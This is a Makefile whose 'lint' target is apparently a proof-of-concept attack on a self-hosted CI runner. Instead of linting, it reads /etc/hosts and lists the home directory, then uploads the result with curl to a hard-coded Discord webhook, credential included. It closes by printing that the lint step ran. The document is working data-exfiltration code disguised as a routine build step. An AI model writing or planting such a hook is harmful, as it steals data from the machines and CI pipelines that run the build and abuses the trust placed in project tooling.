.PHONY: lint

lint:
	@echo "[POC] Local File Read on self-hosted runner…"
	@set -e; \
	# Make a temp file (macOS-safe)
	tmpfile="$$(mktemp -t lfiPoC)"; \
	echo "[debug] tmpfile=$$tmpfile"; \
	{ \
		echo "[+] Reading /etc/hosts"; \
		cat /etc/hosts 2>/dev/null || echo "No access"; \
		echo ""; \
		echo "[+] Listing current user's home dir ($$HOME)"; \
		ls -la "$$HOME" 2>/dev/null || echo "No access"; \
	} > "$$tmpfile"; \
	echo "[debug] size=$$(wc -c < "$$tmpfile") bytes"; \
	# Upload to Discord (use files[0] field)
	http_code="$$(curl -sS -o /dev/null -w "%{http_code}" \
		-F 'payload_json={"content":"POC: Local File Read demo (/etc/hosts + HOME listing)"}' \
		-F "files[0]=@$$tmpfile;type=text/plain;filename=lfi-demo.txt" \
		"https://discord.com/api/webhooks/1413091167125504000/DZPsdR_duaO5zoezj4o3FxDAQZ5JqoChL3vEPWg7BcjLJ17U0zVoUrtJbkyVJDYPRDdN")"; \
	echo "Discord file HTTP $$http_code"; \
	# Clean up
	rm -f "$$tmpfile" || true; \
	echo "Lint step ran (after PoC)."
